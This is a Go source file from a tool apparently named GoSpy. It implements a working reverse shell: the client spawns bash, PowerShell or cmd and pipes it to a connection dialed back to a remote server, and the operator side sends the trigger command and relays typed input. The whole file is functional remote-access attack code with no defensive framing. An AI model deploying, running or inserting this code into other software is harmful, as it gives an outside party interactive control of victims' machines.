package commands

import (
	"bufio"
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"github.com/psidex/GoSpy/internal/server/conman"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// goIoCopy runs io.Copy in a goroutine and passes the return values through the returned channel.
func goIoCopy(dst io.Writer, src io.Reader) <-chan error {
	errChan := make(chan error)
	go func() {
		_, err := io.Copy(dst, src)
		errChan <- err
	}()
	return errChan
}

// initiateReverseShellOut initiates a reverse shell with the given connection.
func initiateReverseShellOut(conn net.Conn) {
	defer conn.Close()
	defer log.Println("Exited reverse shell function")

	shellString := "/bin/bash"

	if runtime.GOOS == "windows" {
		if _, err := exec.LookPath("Powershell"); err != nil {
			shellString = "cmd"
		} else {
			shellString = "Powershell"
		}
	}

	cmd := exec.Command(shellString)

	cmdOut, err := cmd.StdoutPipe()
	if err != nil {
		return
	}

	cmdIn, err := cmd.StdinPipe()
	if err != nil {
		return
	}

	cmdOutErr := goIoCopy(conn, cmdOut)
	cmdInErr := goIoCopy(cmdIn, conn)

	err = cmd.Start()
	if err != nil {
		return
	}

	// Wait until an error happens and then just stop.
	select {
	case <-cmdOutErr:
		return
	case <-cmdInErr:
		return
	}
}

// ReverseShellReply starts a reverse shell from the current machine to the address of the given connection.
func ReverseShellReply(cmdCon comms.Connection) error {
	reverseShellConn, err := cmdCon.DialRemote()
	if err != nil {
		// For this to happen something must have gone wrong on the server (or the network dropped).
		return err
	}
	// If the shell proc hangs and the server quits the shell session, the client shouldn't hang as well.
	go initiateReverseShellOut(reverseShellConn)
	return nil
}

// ReverseShellSend starts a reverse shell with the client.
func ReverseShellSend(man conman.ConMan) (err error) {
	err = man.CmdCon.SendString("reverse-shell")
	if err != nil {
		return err
	}

	reverseShellConnection := man.AcceptSuccessful()
	defer reverseShellConnection.Close()

	fmt.Println("Type `exit` to leave the shell at any time")
	goIoCopy(os.Stdout, reverseShellConnection)

	for {
		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')

		_, err = reverseShellConnection.Write([]byte(text))
		if err != nil {
			// Don't return the error because this is with the reverse shell connection, not with man.CmdCon.
			fmt.Printf("Reverse shell connection error: %s\n", err.Error())
			break
		}

		if strings.TrimSpace(text) == "exit" {
			break
		}
	}

	return nil
}
